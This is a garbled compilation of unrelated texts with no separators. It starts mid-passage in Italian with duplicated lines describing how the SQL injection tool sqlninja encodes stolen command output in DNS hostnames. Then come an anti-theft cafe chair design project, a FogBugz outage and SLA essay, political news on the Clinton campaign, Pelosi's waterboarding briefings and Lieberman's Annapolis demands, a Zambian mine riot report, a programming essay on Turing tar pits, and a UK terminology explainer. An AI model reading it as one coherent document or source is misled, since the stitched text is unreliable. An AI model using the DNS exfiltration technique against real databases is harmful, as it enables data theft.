‘ a’ a ‘ z ’ , più i numeri da 0 a 5 , per un totale di 32 simboli
‘ a’ a ‘ z ’ , più i numeri da 0 a 5 , per un totale di 32 simboli il primo carattere fa da contatore , ciclando in questo caso da ‘ a ’
ad ‘s ’ ; ovviamente il contatore deve essere in grado di utilizzare più
caratteri , se il numero di richieste lo richiede
ad ‘s ’ ; ovviamente il contatore deve essere in grado di utilizzare più caratteri , se il numero di richieste lo richiede il secondo carattere ha sempre valore ‘ 8 ’ , che indica che altri
pacchetti sono in arrivo ; l’ultimo pacchetto ha invece valore ‘ 9 ’
pacchetti sono in arrivo ; l’ultimo pacchetto ha invece valore ‘ 9 ’ il resto dell ’ hostname contiene il risultato del comando .
L’ultimo
pacchetto contiene anche una serie di ‘ 7 ’ , il cui simbolo viene
utilizzato per il padding

Infine in Figura 2 vediamo la decodifica :
Figura 2 . Utilizzo di sqlninja .
Bingo !
E tutto in meno di un secondo , contro i minuti che sarebbero
stati necessari per eseguire il comando , salvarne l’output in una
tabella temporanea , ed estrarne i contenuti un bit alla volta con
tecniche di inference .

How did the project come about ?
In 1999 the DAC Research Initiative , in response to persistent student experiences of bag theft , developed an interest in preventing theft of , and from , people ’s bags in public places and bars or cafes .
Such thefts are commonplace , and victimise people from all walks of life .
For all victims , the consequences range from nuisance and immediate loss of valuables ( costly or sentimental items such photographs ) , to serious ‘ knock - on ’ effects including burglary , identity theft as well as emotional impacts .
How did our research lead to new designs ?
Although the original design brief set by Gamman was aimed at generating new anti theft bags designs , it also identified how café and bar furniture can be complicit with crime .
Indeed , the design brief based on visual documentation of chairs used in cafés and bars delivered by Marcus Willcocks , went on to encourage designers to continue to observe where people left their bags , and to figure out how best to respond to typical behaviour in public places .
DAC ’s visual observations as well as customer feedback interviews , indicated that many bags were stolen when customers were distracted whilst seated on chairs .
Customers either simply forgot where they had put their bags , or were distracted in some way , from keeping guard over their belongings .
Consequently this made bags vulnerable to thieves , who tend to steal them in particular ways .
For example , it is common for the bag to be pushed away by the thief ’s foot from a position on the floor , or lifted / dipped when hanging over the back of a chair .
In the latter instance , we found the design of many kinds of chair was actually complicit in theft , i.e. the furniture allowed or even prompted insecure bag placement on the floor or over the back of chairs in position outside of the owner ’s field of view .
How does this design approach constitute “ social design ” or “ social innovation ” ?
The original aim of the initiative was to demonstrate – to designers , manufacturers , stakeholders from bars and cafes as well as government , the police and end - users – how everyday objects could be given a ‘ securing ’ function without compromising their aesthetics or practicality , or excessively raising the spectre of crime .
For this reason , the original design team ; Lorraine Gamman , Jackie Piper and Marcus Willcocks collaborated to produce a whole series of chairs .
The plan was to show how classic designs such as the Thonet bentwood chairs and the Jacobson
Ant style ply chair could be adapted to include a security function , whilst remaining completely ‘ in - style ’ and making little overt ‘ fuss ’ about the crime prevention aspect .
There was recognition that the securing function for the bag could also be read as a tidy aspect and aimed at keeping bags off the floor out of the way .
The securing function for a whole range of chairs was conferred by a simple cut - out in the front edge of the seat .
This allows the strap of the user ’s bag to be effectively locked beneath them and secured by their legs and those of the chair .
This adds the advantage of bags being sited within the user ’s personal space where few thieves would venture and users are able to respond quickly .
These customised anti crime chairs were first exhibited at Designer ’s Block , Kings Cross in 2000 , together with visualisation of perpetrator techniques that typically accompany bag theft .
The security principle common to the chairs was the idea was that human beings have an innate sense of what Oscar Newman called “ defensible space ” related to the body .
Consequently , by locating the bags to be sat on , at the front of the chair , positioned between the legs of those sitting on the chairs , the defensible space of the body could be involved effortlessly in the protection of belongings .
It brings the user ’s bag within the field of vision or body space , makes it awkward and obvious should a thief try to remove a bag , whilst remaining easy for the user to sit on .
The chairs were shown at a range of exhibitions , culminating in SAFE : Design Takes on Risk at the Museum of Modern Art , New York ( 2005 - 6 ) , where two designs were purchased and incorporated in the permanent collection .
The Stop Thief Chair is a social design because it provides a simple way for bar and café customers to keep their things clean , off the floor , out of the way and importantly , out of reach of thieving fingers ( to reduce opportunities for bag crime ) .
This stylish approach to caring for customers also helps bar staff keep venues clean and avoids jeopardising the image of venues where it is used , since designs are kept on - brand .
What are the strengths of the design ?
A straightforward and easy - to - use securing function has been incorporated at little cost and with little interference to the aesthetics and construction of a classic chair design , without presenting an exaggerated concern with crime .
The Stop Thief Chair has been marketed with Dan Form , the renowned Danish furniture manufacturer , and also with Kian .
Further trials are planned with Starbucks , Victoria in 2011 .
What are the weaknesses of the design ?
The plywood chair design is well suited to the slots cut in the chair , yet for some seats with single - directional grain , other bag holding chair designs that have been concepted by DACRC may need to be pursued .

At 3:30 in the morning of January 10th , 2008 , a shrill chirping woke up our system administrator , Michael Gorsuch , asleep at home in Brooklyn .
It was a text message from Nagios , our network monitoring software , warning him that something was wrong .
He swung out of bed , accidentally knocking over ( and waking up ) the dog , sleeping soundly in her dog bed , who , angrily , staggered out to the hallway , peed on the floor , and then returned to bed .
Meanwhile Michael logged onto his computer in the other room and discovered that one of the three data centers he runs , in downtown Manhattan , was unreachable from the Internet .
This particular data center is in a secure building in downtown Manhattan , in a large facility operated by Peer 1 .
It has backup generators , several days of diesel fuel , and racks and racks of batteries to keep the whole thing running for a few minutes while the generators can be started .
It has massive amounts of air conditioning , multiple high speed connections to the Internet , and the kind of “ right stuff ” down - to - earth engineers who always do things the boring , plodding , methodical way instead of the flashy cool trendy way , so everything is pretty reliable .
Internet providers like Peer 1 like to guarantee the uptime of their services in terms of a Service Level Agreement , otherwise known as an SLA .
A typical SLA might state something like “ 99.99 % uptime . ”
When you do the math , let ’s see , there are 525,949 minutes in a year ( or 525,600 if you are in the cast of Rent ) , so that allows them 52.59 minutes of downtime per year .
If they have any more downtime than that , the SLA usually provides for some kind of penalty , but honestly , it ’s often rather trivial … like , you get your money back for the minutes they were down .
I remember once getting something like $ 10 off the bill once from a T1 provider because of a two day outage that cost us thousands of dollars .
SLAs can be a little bit meaningless that way , and given how low the penalties are , a lot of network providers just started advertising 100 % uptime .
Within 10 minutes everything seemed to be back to normal , and Michael went back to sleep .
Until about 5:00 a.m .
This time Michael called the Peer 1 Network Operations Center ( NOC ) in Vancouver .
They ran some tests , started investigating , could n’t find anything wrong , and by 5:30 a.m. things seemed to be back to normal , but by this point , he was as nervous as a porcupine in a balloon factory .
At 6:15 a.m. the New York site lost all connectivity .
Peer 1 could n’t find anything wrong on their end .
Michael got dressed and took the subway into Manhattan .
The server seemed to be up .
The Peer1 network connection was fine .
The problem was something with the network switch .
Michael temporarily took the switch out of the loop , connecting our router directly to Peer 1 ’s router , and lo and behold , we were back on the Internet .
By the time most of our American customers got to work in the morning , everything was fine .
Our European customers had already started emailing us to complain .
Michael spent some time doing a post- mortem , and discovered that the problem was a simple configuration problem on the switch .
There are several possible speeds that a switch can use to communicate ( 10 , 100 , or 1000 megabits / second ) .
You can either set the speed manually , or you can let the switch automatically negotiate the highest speed that both sides can work with .
The switch that failed had been set to autonegotiate .
This usually works , but not always , and on the morning of January 10th , it did n’t .
Michael knew this could be a problem , but when he installed the switch , he had forgotten to set the speed , so the switch was still in the factory - default autonegotiate mode , which seemed to work fine .
Until it did n’t .
Michael was n’t happy .
He sent me an email :
I know that we do n’t officially have an SLA for On Demand , but I would like us to define one for internal purposes ( at least ) .
It ’s one way that I can measure if myself and the ( eventual ) sysadmin team are meeting the general goals for the business .
I was in the slow process of writing up a plan for this , but want to expedite in light of this morning ’s mayhem .
An SLA is generally defined in terms of ‘ uptime ’ , so we need to define what ‘ uptime ’ is in the context of On Demand .
Once that is made clear , it ’ll get translated into policy , which will then be translated into a set of monitoring / reporting scripts , and will be reviewed on a regular interval to see if we are ‘ doing what we say ’ .
Good idea !
But there are some problems with SLAs .
The biggest one is the lack of statistical meaningfulness when outages are so rare .
We ’ve had , if I remember correctly , two unplanned outages , including this one , since going live with FogBugz on Demand six months ago .
Only one was our fault .
Most well - run online services will have two , maybe three outages a year .
With so few data points , the length of the outage starts to become really significant , and that ’s one of those things that ’s wildly variable .
Suddenly , you ’re talking about how long it takes a human to get to the equipment and swap out a broken part .
To get really high uptime , you ca n’t wait for a human to switch out failed parts .
You ca n’t even wait for a human to figure out what went wrong : you have to have previously thought of every possible thing that can possibly go wrong , which is vanishingly improbable .
It ’s the unexpected unexpecteds , not the expected unexpecteds , that kill you .
Really high availability becomes extremely costly .
The proverbial “ six nines ” availability ( 99.9999 % uptime ) means no more than 30 seconds downtime per year .
That ’s really kind of ridiculous .
Even the people who claim that they have built some big multi-million dollar superduper ultra- redundant six nines system are gonna wake up one day , I do n’t know when , but they will , and something completely unusual will have gone wrong in a completely unexpected way , three EMP bombs , one at each data center , and they ’ll smack their heads and have fourteen days of outage .
Think of it this way :
If your six nines system goes down mysteriously just once and it takes you an hour to figure out the cause and fix it , well , you ’ve just blown your downtime budget for the next century .
Even the most notoriously reliable systems , like AT&T ’s long distance service , have had long outages ( six hours in 1991 ) which put them at a rather embarrassing three nines … and AT&T ’s long distance service is considered “ carrier grade , ” the gold standard for uptime .
Keeping internet services online suffers from the problem of black swans .
Nassim Taleb , who invented the term , defines it thus : “ A black swan is an outlier , an event that lies beyond the realm of normal expectations . ”
Almost all internet outages are unexpected unexpecteds : extremely low - probability outlying surprises .
They ’re the kind of things that happen so rarely it does n’t even make sense to use normal statistical methods like “ mean time between failure . ”
What ’s the “ mean time between catastrophic floods in New Orleans ? ”
Measuring the number of minutes of downtime per year does not predict the number of minutes of downtime you ’ll have the next year .
It reminds me of commercial aviation today : the NTSB has done such a great job of eliminating all the common causes of crashes that nowadays , each commercial crash they investigate seems to be a crazy , one - off , black - swan outlier .
Somewhere between the “ extremely unreliable ” level of service , where it feels like stupid outages occur again and again and again , and the “ extremely reliable ” level of service , where you spend millions and millions of dollars getting an extra minute of uptime a year , there ’s a sweet spot , where all the expected unexpecteds have been taken care of .
A single hard drive failure , which is expected , does n’t take you down .
A single DNS server failure , which is expected , does n’t take you down .
But the unexpected unexpecteds might .
That ’s really the best we can hope for .
To reach this sweet spot , we borrowed an idea from Sakichi Toyoda , the founder of Toyota .
He calls it Five Whys .
When something goes wrong , you ask why , again and again , until you ferret out the root cause .
Then you fix the root cause , not the symptoms .
Since this fit well with our idea of fixing everything two ways , we decided to start using five whys ourselves .
Here ’s what Michael came up with :
Our link to Peer1 NY went down
Why ?
–
Our switch appears to have put the port in a failed state
Why ?
–
After some discussion with the Peer1 NOC , we speculate that it was quite possibly caused by an Ethernet speed / duplex mismatch
Why ?
–
The switch interface was set to auto - negotiate instead of being manually configured
Why ?
–
We were fully aware of problems like this , and have been for many years .
But – we do not have a written standard and verification process for production switch configurations .
Why ?
– Documentation is often thought of as an aid for when the sysadmin is n’t around or for other members of the operations team , whereas , it should really be thought of as a checklist .
“ Had we produced a written standard prior to deploying the switch and subsequently reviewed our work to match the standard , this outage would not have occurred , ” Michael wrote .
“ Or , it would occur once , and the standard would get updated as appropriate . ”
After some internal discussion we all agreed that rather than imposing a statistically meaningless measurement and hoping that the mere measurement of something meaningless would cause it to get better , what we really needed was a process of continuous improvement .
Instead of setting up a SLA for our customers , we set up a blog where we would document every outage in real time , provide complete post - mortems , ask the five whys , get to the root cause , and tell our customers what we ’re doing to prevent that problem in the future .
In this case , the change is that our internal documentation will include detailed checklists for all operational procedures in the live environment .
Our customers can look at the blog to see what caused the problems and what we ’re doing to make things better , and , hopefully , they can see evidence of steadily improving quality .
In the meantime , our customer service folks have the authority to credit customers ’ accounts if they feel like they were affected by an outage .
We let the customer decide how much they want to be credited , up to a whole month , because not every customer is even going to notice the outage , let alone suffer from it .
I hope this system will improve our reliability to the point where the only outages we suffer are really the extremely unexpected black swans .
PS .
Yes , we want to hire another system administrator so Michael does n’t have to be the only one to wake up in the middle of the night .
“ What ’s gone wrong is very simple , ” said Hassan Nemazee , a national finance chair for Hillary Clinton ’s presidential campaign .
“ If we had won Iowa and New Hampshire , as we had anticipated , projected , et cetera , you would not have been in a situation in which you are losing all of these small states — because we did n’t put any resources in those small states , ” he said .
“ Obama , on the other hand , put resources in these small states . ”
Compounding the damage of the bad defeats in Iowa , and then South Carolina , Mr. Nemazee explained , was the lack of the necessary foresight to invest the campaign ’s resources in the states that Mrs. Clinton ’s rival , Barack Obama , is now gobbling up as fuel for his ever more threatening momentum .
“ You needed to have a Plan B , and Plan B was just doing what we are doing right now rather than having resources in the small states , ” he said .
“ We basically ceded every one of these small red states that he has racked up victories in .
And the reason that he has racked up victories at this level is n’t because he was so much more well received , or because his message was any better ; it was because we did n’t put any resources in there .
We were n’t campaigning there .
We did n’t have anybody in Utah , in Idaho , in the Dakotas .
In Alaska . ”
On Feb. 12 , the picture got even worse , as the voters of Maryland , the District of Columbia and Virginia all appeared set to hand lopsided wins to Mr. Obama .
With a cold and bleak February calendar staring straight at them — other states set to vote this month are Wisconsin and Mr. Obama ’s former home , Hawaii — some of Mrs. Clinton ’s supporters are wondering how long she can keep losing without her support collapsing in the remaining contests .
Mrs. Clinton has made a show of addressing those concerns by replacing her campaign manager , Patti Solis Doyle , with another loyalist , Maggie Williams .
( Several donors interviewed for this story said , in retrospect , that they thought Ms. Doyle was in over her head . )
But at this point , no change in personnel alters the campaign ’s prescription for recovering its position : win Ohio and Texas on March 4 , and Pennsylvania on April 22 .
“ If she does n’t do well in these states , ” said Mr. Nemazee , “ it ’s a completely different matter , and the momentum swings completely over to the other side . ”
The Clinton campaign ’s other scenario — Mrs. Clinton loses a majority of elected delegates but is protected by a buffer of party - appointed superdelegates to make up the difference — looks increasingly unlikely .
“ The superdelegates are going to by and large mirror the popular vote , ” said Senator Chuck Schumer , himself a superdelegate .
Mr. Schumer said he was “ committed ” to Mrs. Clinton no matter what .
Asked if there would n’t be a revolt in the party if superdelegates undid the results of the state primaries and caucuses , he suggested that there was some wiggle room .
“ If the election is that close that 10 superdelegates going one way rather than the other way [ decides it ] ?
No .
People will say it was a very close election . ”
But , he said , “ I do n’t see a massive move of superdelegates different than how their states voted . ”
The states may well end up voting for Mrs. Clinton in the end .
But the realization that seems to have set in , somewhat jarringly , among her supporters is that there ’s no safety net if they do n’t .
“ Everybody is taken aback — nobody expected it , ” said John Catsimatidis , a supermarket magnate and prominent donor to Mrs. Clinton .
( He was bestowed with the title of “ Hillraiser ” by the Clinton campaign , signifying that he had raised more than $ 100,000 . )
“ Nobody expected Obama to be so strong .
And at the end of the day , I think the Clintons will win out .
But I have been saying that all along and it is getting harder to keep saying that . ”
“ Here ’s the thing , ” said Yashar Hedayat , a prominent fund - raiser for Mrs. Clinton in Los Angeles .
“ I have a lot of donors who are nervous , who are looking at the calendar like you are and saying , ‘ How is this possible ? ’
But I feel very good about Ohio and Texas and Pennsylvania . ”
The bad news is that an Ohio - Texas - Pennsylvania strategy sets a very real deadline , past which it becomes just about impossible to argue that there ’s still time to turn things around .
It ’s March 4 ( and April 22 ) or bust .

Some Chinese mines in Zambia have poor safety records
An estimated 500 workers at the Chinese - owned Chambishi mine site started throwing stones at the managers as they attempted to hold talks .
Police came in to restore order and rescue the Chinese who had taken refuge by locking themselves in their offices .
Several buildings were burned in the violence and a protester was injured .
Last year , China 's president cancelled a visit to Chambishi fearing protests .
A blast at the copper mine killed 50 people in 2005 .
Holiday rumours
Chambishi Smelter , which is under construction , is part of a huge multi-million dollar Chinese investment in the area .
The Chinese are not respecting Zambian labour laws
Teddy Chisala
Workers ' representative
Miners see ' little reward '
The BBC's Boyd Chibale in Kitwe says a kitchen for Chinese workers and a guard 's house were set alight and hostel windows smashed in the violence .
Our correspondent says the workers have now gone home , and the Chinese management are in talks with the unions .
The protest was sparked by rumours that members of the Chinese management team were about to go on holiday , which workers feared would delay negotiations to improve their conditions of service .
" The Chinese are not respecting Zambian labour laws , " workers ' representative Teddy Chisala told the AFP news agency .
In recent years , China has emerged as one of the biggest buyers of Zambian copper .
But correspondents say Chinese investment in mining and manufacturing has not been without controversy - with constant industrial disputes amidst allegations of poor working conditions .
In elections in 2006 , opposition candidate Michael Sata ran on an anti-China ticket , calling for " Zambia for Zambians " .
Secretly briefed , Pelosi did not object to waterboarding in 2002 John Byrne
Published : Sunday December 9 , 2007
del.icio.us
Print This Email This Pelosi would later boot sole objector to program from chance to chair Intelligence Committee Two senior Republicans and Democrats in Congress -- including House Speaker Nancy Pelosi -- were briefing on the CIA 's program to use waterboarding on terror suspects in September 2002 and did not object , according to Sunday 's Washington Post .
In the long - ranging article , which seemingly takes the lawmakers and the Bush Administration to task by discussing the practice 's emergence in Nazi Germany and other totalitarian states , a Pelosi aide said the Speaker remembered discussion of " enhanced " interrogation techniques and " acknowledged that Pelosi did not raise objections at the time . "
" In September 2002 , four members of Congress met in secret for a first look at a unique CIA program designed to wring vital information from reticent terrorism suspects in U.S. custody , " the Post wrote .
" For more than an hour , the bipartisan group , which included current House Speaker Nancy Pelosi ( D - Calif. ) , was given a virtual tour of the CIA 's overseas detention sites and the harsh techniques interrogators had devised to try to make their prisoners talk . "
" Among the techniques described , said two officials present , was waterboarding , a practice that years later would be condemned as torture by Democrats and some Republicans on Capitol Hill , " the Post added .
" But on that day , no objections were raised .
Instead , at least two lawmakers in the room asked the CIA to push harder , two U.S. officials said . "
Democrats have since been vehement critics of the practice , piggybacking on public outrage to a practice many have described as torture -- including 2008 Republican presidential candidate John McCain ( R - AZ ) who was tortured in the Vietnam War .
Only Rep. Jane Harman ( D - CA ) -- then the second - ranking Democrat on the House Intelligence Committee who would supplant Pelosi in 2003 -- formally objected .
Harman , who was set to lead the House Intelligence Committee when the Democrats retook the chamber in 2006 , was pushed aside by Pelosi when she took over as Speaker , in what was seen as an element of personal rivalry .
" Harman , who replaced Pelosi as the committee 's top Democrat in January 2003 , disclosed Friday that she filed a classified letter to the CIA in February of that year as an official protest about the interrogation program , " the Post notes .
" Harman said she had been prevented from publicly discussing the letter or the CIA 's program because of strict rules of secrecy . "
" When you serve on intelligence committee you sign a second oath -- one of secrecy , " she said .
" I was briefed , but the information was closely held to just the Gang of Four .
I was not free to disclose anything . "
None of the other lawmakers briefed raised formal objections .
Those lawmakers included former Sen. Bob Graham ( D - FL ) , former Sen. John Rockefeller IV ( D - WV ) , former Rep. Porter Goss ( R- FL ) and Sen. Pat Roberts ( R- KN ) .
" Individual lawmakers ' recollections of the early briefings varied dramatically , but officials present during the meetings described the reaction as mostly quiet acquiescence , if not outright support , " the Post added .
' Among those being briefed , there was a pretty full understanding of what the CIA was doing , ' said Goss , who chaired the House intelligence committee from 1997 to 2004 and then served as CIA director from 2004 to 2006 .
' And the reaction in the room was not just approval , but encouragement . ' "

I love to babble about " social issues of software development " .
I try to avoid mentioning them in technical discussions ( also known as " flame wars " ) because it makes a particularly lousy argument .
Other than that , I just love talking about it .
Face it : software is written by people for people .
Most of it smells like a hairless pink ape .
Nothing formal or provable / refutable or scientific or universally correct about it .
People stuff .
Like furniture , or jewelry , or porn , or screwdrivers .
The machine merely follows orders , the humans are the serious players .
Social Issues are what makes those bits move .
So , Social Issues .
Today 's Social Issue is this : programmers adore Turing tar pits .
Turing tar pits are addictive .
You can render programmers completely paralyzed from any practical standpoint by showing them a tar pit and convincing them to jump into it .
A Turing tar pit is a Turing - complete virtual machine that does n't support straightforward implementation of bread - and - butter programmer stuff .
Bread - and - butter programmer stuff includes arithmetics , variables , loops , data structures , functions and modules and other such trivial and awfully handy goodies .
A canonical example of a Turing tar pit is the Brainfuck programming language .
Implementing a decimal calculator or a sokoban game in sed is also a consensus example of Turing tar pit swimming as far as I know .
By " consensus " , I mean that nobody writes software that people are actually supposed to use on top of those VMs .
Some Turing tar pits are used as vehicles for production code .
C++ templates .
A crippled everything - is - a - type VM .
Try writing a compile - time loop using them ; then , try to implement a compile - time hash table .
I find the implementation of a decimal calculator in sed more concise in certain aspects .
But people do awfully hairy things with C++ templates , like boost .
The fun of implementing such things can only be compared to the fun of using them ( error messages which would take a whole tree to print out on paper and such ) .
TeX .
A crippled everything - is - a - text - transformation VM .
A great back - end with a nightmarish front - end , as far as I can tell .
You get neither WYSIWYG nor the ability to mechanically analyze the content ( the document is basically code which transforms itself , and transforms itself , and transforms itself , and you can't make any sense of the document without , um , running it ) .
But people do unimaginably hairy things on top of TeX , like LaTeX .
You actually have to debug LaTeX documents , and I bet that the best TeX debugger is somewhat worse than the worst C debugger out there .
Shell scripts .
A crippled everything - is - a - process - unless - it 's - a - string VM .
Debugging clearly was n't on the list of Useful Activities which the shell was meant to support .
" rm : Is a directory " .
Gotta love that .
Of course people write huge shell scripts .
One excuse is that they want to modify env vars in the user 's shell , and " only a shell script can do that " ( wrong – you can use eval `sane - prog` instead of source insane - shell - script ) .
A particularly awesome kind of shell script is the multi- kilobyte one - liner ( find | grep | awk | grep - v | fuck - off - and - die ) .
I 'll tell you why it happens .
When you write code in a full - featured programming language , clearly you can do a lot of useful things .
Because , like , everybody can .
So the job has to be quite special to give you satisfaction ; if the task is prosaic , and most of them are , there 's little pride you 're going to feel .
But if the language is crippled , it 's a whole different matter .
" Look , a loop using templates ! "
Trivial stuff becomes an achievement , which feels good .
I like feeling good .
Templates are powerful !
What do you mean by " solving a non-problem ? "
Of course I 'm solving real problems !
How else are you going to do compile - time loops in C ++?
How else are you going to modify env vars of the parent shell ?!
I 'm using my proficiency with my tools and knowledge of their advanced features to solve problems !
Damn , I 'm good !
By the way , here 's another entry in The Modern Software Industry Dictionary :
Powerful
adj .
An attribute of programming environments or their individual features , most often Turing tar pits .
A feature is " powerful " when at least one of the following holds :
It can be used to implement something trivial in an pointlessly complicated way .
It can cause a lot of damage .
Seriously , it seems like 85 % percents of the contexts where something is called " powerful " , it really means " useless and dangerous " .
Unlike most entries in the Modern Software Industry Dictionary , I do n't consider this word a meaningless cheerleader noise .
I think it actually carries semantics , making it a pretty good warning sign .
Back to our subject .
A Turing tar pit deployed on a massive scale has two effects on programmers who got addicted to it :
They waste an awful lot of time ( ab ) using it .
Pretty obvious ?
Wait , there 's more !
They come to think that the sort of work they 're used to accomplish with a Turing tar pit should always be done using a Turing tar pit .
And this is just depressing .
It really is .
Lisp - style macros , D - style mixins and code generation using DSL compilers are some ways to do compile - time things in a not entirely brain - crippled fashion .
You know , you can actually concatenate two strings , which is unimaginable luxury in the world of C++ templates .
People are actually afraid of these things .
These people are n't cowards , mind you .
These are the same people who'd fearlessly delve into the darkest caves of template metaprogramming .
Sure , it 's " non-trivial " , but sometimes you need the Powerful Features to get your job done !
But a full - blown programming language for compile - time work ?
Are you kidding ?
That is just too dangerous and unmaintainable !
And anyway , you can do everything with templates – they 're Turing - complete !
Neat , ai n't it ?!
Alternatives to TeX … I 'm bad at this , I really am , so you wo n't get a detailed rant on this subject .
Let 's just say that WYSIWYG is underestimated by many programmers , and extending a wiki engine , even one written in PHP , beats extending TeX hands down .
This is n't a first - hand evidence , just generic Turing - tar - pit intuition .
This is the part where you can tell me that I 'm a moron and get away without a symmetrical remark .
In particular , TeX seems to have awfully good back - ends ; I do n't think it can possibly justify heavy usage of its front - end macro facilities , but , um , everything is possible .
Scripting .
Back to yosefk 's - perceived - competence - land .
When people hear about a new language , and they 're told that it 's a scripting language , not only do n't they treat it seriously , they insist on emulating a Turing tar pit in it .
They call system ( ) and pass it incomprehensible 300 - character pipelines .
They write everything in one big bulk , without using functions or classes .
They ignore data structures and regular expressions and call awk when they need them the way they 'd do in a shell script .
From Python or Ruby or Perl .
This is how you write scripts , you know .
Interesting , is n't it ?
I find it fascinating .
I think that software is to wetware what leaves are to trunks ; to figure out the leaves , you have to saw through the trunk and see what 's inside , or something .
I also think that crappy software is n't necessarily written by dumb people , although that helps .
I think that the attitude and the state of mind is at least as important as raw aptitude , much like the direction at which you aim a cannon is n't less important than its range .
I 'll definitely share those thoughts with you , as well as many others , but that will have to wait for another time .
It 's been a pleasure having you with us .
Good night .
So I guess a lot of people are in some doubt as to what the difference is between England , Great Britain , the British Isles and the United Kingdom .
Here I present a handy - dandy Venn diagram to explain this .
The republic of Ireland and the United Kingdom are the only two sovereign states in this image .
They are shown in red .
Ireland and Great Britain are both islands and are shown in green .
England , Scotland , Wales and Northern Ireland are constituent countries of the United Kingdom and are shown in orange .
Here , the term " constituent country " is not used in the same way that " country " is usually used ; England , Scotland , Wales and Northern Ireland are political subdivisions of the UK , and it is the UK which appears in international bodies such as the United Nations and NATO .
You have the basic idea .
There are many other islands in the British Isles which are not shown here .
Most of these are politically part of England , Scotland , Wales , Northern Ireland or the republic of Ireland , with the exceptions of the Isle of Man and the Channel Islands , which are British crown dependencies and not part of the UK ( or ROI ) at all .
Nomenclature
The UK's full name is " the United Kingdom of Great Britain and Northern Ireland " .
" Britain " is not a technically correct term for any political or geographical entity .
Nevertheless , " Britain " is in frequent use , and taken to mean either " the UK " or " Great Britain " .
This usage is pretty unfair to Northern Ireland whichever way you look at it .
The ROI 's full name is " Ireland " ( if you are speaking English ) or " Éire " ( if you are speaking Irish ) .
Ireland is popularly referred to as " the Republic of Ireland " in order to distinguish it from the island of Ireland , and the country is indeed a republic , but " the Republic of " is not part of the country 's official name , and I suppose technically this means that the R need not be capitalised .
Citizenship and ethnicity
Citizens of the UK are called " British " .
One British person is called a Briton .
Citizens of the ROI are called " Irish " .
Irish citizens are not British citizens .
British citizens are not Irish citizens .
People whose ancestors were from England are called " English " .
People whose ancestors were from Scotland are called " Scottish " .
People whose ancestors were from Wales are called " Welsh " .
People whose ancestors were from Northern Ireland are called " Northern Irish " .
People whose ancestors were from the republic of Ireland are called " Irish " .
There is no such thing as English , Scottish , Welsh or Northern Irish citizenship .
English , Scottish , Welsh and Northern Irish people almost always hold British citizenships .
Of course , anybody , living anywhere in the British Isles or the world , can have any ethnicity , and hold any citizenship .
Complications
Many people living in Northern Ireland ( which is part of the UK ) are citizens of the ROI ( which is not part of the UK ) .
Some citizens of the UK living in Northern Ireland ( which is part of the UK ) classify themselves as Irish - ethnic .
Some people living in Northern Ireland ( which is part of the UK ) would even like Northern Ireland itself classified as part of the ROI instead of the UK .
This is a contentious point .
The ROI is not British .
However , the " British Isles " include both the UK and ROI .
Irish citizens and Irish - ethnic people hate this , but there is no consensus on what to call it instead .
England , Wales , Scotland , Northern Ireland and the republic of Ireland often field separate teams in such international sports as rugby , football ( i.e. the World Cup ) and cricket .
Meanwhile , the Irish international rugby team is composed of players chosen from both the ROI and Northern Ireland .
This is largely because our various nations have been playing rugby , football and cricket for centuries , whereas the current political arrangement of the British Isles was only established in 1920 .
Athletes from the UK ( which includes Northern Ireland ) compete in the Olympic Games as Team GB , where " GB " stands for " Great Britain " ( which does not include Northern Ireland ) .
There is no good reason for this .
The UK's ISO 3166 - 1 alpha - 2 code is GB , its ISO 3166 - 1 alpha - 3 code is GBR and its NATO trigram is also GBR .
Again , there is no good reason for these designations .
Note that the UK's NATO digram is UK .
Lastly , to be pedantic , this is actually an Euler diagram , not a Venn diagram .
Is there a Little / Lesser Britain ?
Yes .
It is called Brittany and it is in northwest France .
Deputy Prime Minister and Minister for Strategic Affairs Avigdor Lieberman drew his red lines on Saturday night in an official document presented to Prime Minister Ehud Olmert ahead of the US - sponsored Mideast peace conference scheduled to take place in Annapolis by the end of the year .
Lieberman demanded that the permanent agreement with the Palestinians include an exchange of populations and territories , in a way which will guarantee the Jews a majority of 80 % in the State of Israel
Minister 's Plan Lieberman lays out J'lem plans / Netal Sela During tour of City of David , strategic affairs minister says Israel ' prepared to swap territories and populations '
Full story
The document released by Lieberman 's office included the following objectives for the diplomatic negotiations with the Palestinians on the permanent agreements :
1. Israel 's permanent borders will be based on historic , security - related , demographic and geographic parameters .
2 . Any future diplomatic agreement must guarantee the State of Israel 's Jewish , Zionist and democratic nature .
3 . Any future diplomatic agreement will include recognition of the permanent borders by the international community , the neighboring countries , and the Palestinians .
4 . Any future diplomatic agreement will include a clause guaranteeing the end of the conflict , meaning no mutual demands in the future .
Lieberman demanded that Olmert determine Jerusalem 's borders in a way that will leave the " holy basin " under full Israeli sovereignty , while implementing the religious ritual arrangements .
The borders of the " holy basin " , according to Lieberman : From the east : The Mount of Olives and Mount Scopus ; from the north : Sheikh Jarrah ; from the south : Silwan and Mount Zion .
The territory and population exchange principle will also apply to the refugee camps and villages near Jerusalem .
Lieberman opposed the issue of a safe crossing between Gaza and the West Bank .
" The State of Israel will not allow a passage between Gaza and Judea and Samaria through its sovereign territory .
This situation is similar to the reality which existed before June 4 , 1967 , as well as the reality before the establishment of the State of Israel . "
Addressing the refugee issue , the Yisrael Beiteinu chairman ruled that " the State of Israel will not allow the right of return , not on the level of principles and not in humanitarian cases .
This issue is definite and will not be negotiated . "
Guarantee a Jewish majority in Israel
Lieberman also outlined the principles guiding his party : " Entering negotiations on the permanent agreement requires first and foremost obtaining security for the State of Israel and a significant improvement in the Palestinians ' economic situation .
" Any attempt to force a diplomatic arrangement before a substantial drop in terrorist activities , particularly the Qassam fire , and in a reality in which there is an unemployment rate of more than 80 % on the Palestinian side – is destined to fail .
" A salutation to the conflict must be based on an agreement to exchange territories and populations , and the creation of a reality of two homogenous nation - states , so as not to create a situation in which the Palestinians have a state and a half and the Jews have half a state .
" This principle is crucial , particularly in light of the vision presented by the Israeli Arab Higher Monitoring Committee .
We must not accept a reality in which a Palestinian state will be established without one Jew , while the State of Israel turns into a bi-national state with more than 20 % minorities . "
The minister also ruled that " the State of Israel 's permanent borders will guarantee the continuation of the Jewish majority and the democratic regime , and will provide security for all its citizens .
" The permanent agreement which will be signed between the parties will constitute a joint and international agreement and will replace Security Council Resolutions 242 and 338 .
The international community is committed to be a side in the agreement , while providing guarantees and being actively involved in security - related , diplomatic and economic issues . "
Lieberman also demanded that NATO forces be stationed in the territories should the Palestinians fail to create an effective security system to halt terrorist activities .
He added that the United States and the European Union must invest directly in the Palestinian economy in order to guarantee an appropriate standard of living and workplaces for the Palestinians .
